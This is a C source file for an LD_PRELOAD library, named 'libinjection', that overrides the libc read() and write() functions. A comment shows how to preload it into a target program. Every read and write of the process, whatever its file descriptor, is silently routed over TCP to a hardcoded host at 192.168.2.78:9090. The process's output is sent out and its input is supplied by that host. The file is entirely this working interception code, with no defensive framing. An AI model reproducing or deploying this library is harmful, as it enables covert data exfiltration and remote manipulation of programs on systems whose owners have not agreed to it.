/*
* To change this license header, choose License Headers in Project Properties. * To change this template file, choose Tools | Templates* and open the template in the editor.*/
// LD_PRELOAD=./libinjection-so.so ./code-injection or export LD_PRELOAD=./libinjection-so.so
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>


#define SERVER_ADDR "192.168.2.78"
//#define SERVER_ADDR "127.0.0.1"

#define SERV_PORT 9090

static int inj_sockfd = -1;

static struct sockaddr_in inj_servaddr;

ssize_t read(int fd, void *buf, size_t size) {

    if (inj_sockfd == -1) {
        inj_sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (inj_sockfd < 0) {
            printf("socket error");
            return 1;
        }

        bzero(&inj_servaddr, sizeof(inj_servaddr));
        inj_servaddr.sin_family = AF_INET;
        inj_servaddr.sin_port = htons(SERV_PORT);

        if (inet_pton(AF_INET, SERVER_ADDR, &inj_servaddr.sin_addr) <= 0) {
            printf("inet_pton error");
            return 1;
        }

        if (connect(inj_sockfd, (struct sockaddr *)&inj_servaddr, sizeof(inj_servaddr)) < 0) {
            perror("connect error");
            return 1;
        }
        printf("client connect ok : inj_sockfd = %d\n", inj_sockfd);
    }

    int nread = 0;
    int nleft = size;
    unsigned char *ptr = (char *)buf;

    while (nleft > 0) {

        nread = recv(inj_sockfd, ptr, nleft, MSG_DONTWAIT);

        if (nread <= 0) {
            if (errno == EAGAIN) {
                continue;
            }
            perror("inj recv error");
        }

        nleft -= nread;
        ptr += nread;
    }
    return size - nleft;

}


ssize_t write(int fd, const void *buf, size_t size) {

    if (inj_sockfd == -1) {
        inj_sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (inj_sockfd < 0) {
            printf("socket error");
            return 1;
        }
        bzero(&inj_servaddr, sizeof(inj_servaddr));
        inj_servaddr.sin_family = AF_INET;
        inj_servaddr.sin_port = htons(SERV_PORT);

        if (inet_pton(AF_INET, SERVER_ADDR, &inj_servaddr.sin_addr) <= 0) {
            printf("inet_pton error");
            return 1;
        }
        if (connect(inj_sockfd, (struct sockaddr *)&inj_servaddr, sizeof(inj_servaddr)) < 0) {
            perror("connect error");
            return 1;
        }
        printf("\nPRELOAD ok : inj_sockfd = %d\n", inj_sockfd);
    }

    int nwrite = 0;
    int nleft = 0;
    const char *ptr;

//  usleep(5000);

    ptr = buf;
    nleft = size;
    while (nleft > 0) {

        nwrite = send(inj_sockfd, ptr, nleft, MSG_DONTWAIT);
        if (nwrite <= 0) {

            if (errno == EAGAIN) {
                continue;
            }
            perror("inj send error");
        }
        nleft -= nwrite;
        ptr += nwrite;
    }

    return size;
}

